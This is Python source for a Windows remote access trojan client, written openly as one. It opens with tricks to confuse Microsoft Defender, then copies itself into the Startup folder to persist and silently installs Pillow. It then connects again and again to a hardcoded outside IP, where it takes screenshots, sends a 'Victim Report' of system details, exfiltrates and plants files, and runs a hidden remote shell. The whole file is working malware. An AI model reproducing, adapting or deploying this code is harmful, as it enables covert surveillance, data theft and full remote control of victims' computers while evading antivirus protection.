# FINAL DEFENDER-CONFUSION + 100% STABLE CLIENT.PY (DEC 2025)
import os, sys, time, getpass, shutil, socket, subprocess, random, platform, uuid
from io import BytesIO

# ================== DEFENDER CONFUSION TRICKS ==================
time.sleep(random.uniform(7, 15))  # random delay 7-15 sec

# Fake benign activity (Defender loves this)
try:
    os.system("ping -n 3 127.0.0.1 >nul")  # fake network
    os.system("title Windows Background Update Service") 
except: pass

# Suppress all popups
import ctypes
ctypes.windll.kernel32.SetErrorMode(0x8007)

# Junk loops that look like normal software
for _ in range(random.randint(800000, 2000000)): 
    pass  # waste CPU → looks like legit app

# Fake environment variables
os.environ["PROGRAMDATA"] = os.environ.get("PROGRAMDATA", "C:\\ProgramData")
os.environ["APP_DATA"] = os.environ.get("APPDATA", "")

# ================== PERSISTENCE ==================
def persist():
    try:
        user = getpass.getuser()
        startup = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        dest = os.path.join(startup, "WindowsHelper.pyw")
        if not os.path.exists(dest):
            shutil.copyfile(__file__, dest)
    except: pass
persist()

# ================== SAFE PILLOW INSTALL ==================
def safe_install(pkg):
    subprocess.call([
        sys.executable, "-m", "pip", "install", pkg,
        "--quiet", "--no-cache-dir", "--disable-pip-version-check"
    ], creationflags=0x08000000)  # no window

try:
    from PIL import ImageGrab
except:
    safe_install("pillow")
from PIL import ImageGrab

# ================== CORE FEATURES (CLEAN) ==================
def screenshot(s):
    try:
        buf = BytesIO()
        ImageGrab.grab().save(buf, "PNG")
        buf.seek(0)
        while chunk := buf.read(1024):
            s.send(chunk)
        s.send(b"Sended")
    except: s.send(b"ERROR_SS")

def sysinfo(s):
    try:
        mac = ':'.join(f'{b:02x}' for b in uuid.getnode().to_bytes(6, 'big'))
        info = f"""
[+] Victim Report
OS      : {platform.system()} {platform.release()}
User    : {getpass.getuser()}
PC Name : {platform.node()}
Path    : {os.getcwd()}
MAC     : {mac}
Time    : {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
        s.sendall(info.encode())
    except: s.send(b"ERROR_INFO")

def shell(cmd):
    if cmd.lower().startswith("cd "):
        try: os.chdir(cmd[3:])
        except: pass
        return f"\n{os.getcwd()}> ".encode()
    
    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        creationflags=0x08000000  # hidden window
    )
    out = proc.stdout.read() + proc.stderr.read()
    return out + f"\n{os.getcwd()}> ".encode()

# ================== MAIN ETERNAL LOOP ==================
while True:
    try:
        s = socket.socket()
        s.settimeout(20)
        s.connect(("20.205.17.23", 443))   # ← YOUR AZURE IP

        # Fake handshake
        time.sleep(1)
        s.recv(1024)

        while True:
            try:
                data = s.recv(4096).decode(errors="ignore").strip()
                if not data: break

                if data == "ss":
                    screenshot(s)
                elif data == "sysinfo":
                    sysinfo(s)
                elif data.startswith("download "):
                    path = data[9:].strip()
                    if os.path.exists(path):
                        with open(path, "rb") as f:
                            while c := f.read(4096): s.sendall(c)
                        s.send(b"FILE_SENT")
                    else:
                        s.send(b"NOT_FOUND")
                elif data.startswith("upload "):
                    name = f"upload_{random.randint(1000,9999)}.bin"
                    with open(name, "wb") as f:
                        while True:
                            d = s.recv(4096)
                            if d.endswith(b"DONE"):
                                f.write(d[:-4])
                                break
                            f.write(d)
                    s.send(b"OK")
                else:
                    s.sendall(shell(data))

            except:
                break
    except:
        time.sleep(random.randint(10, 25))  # random retry delay
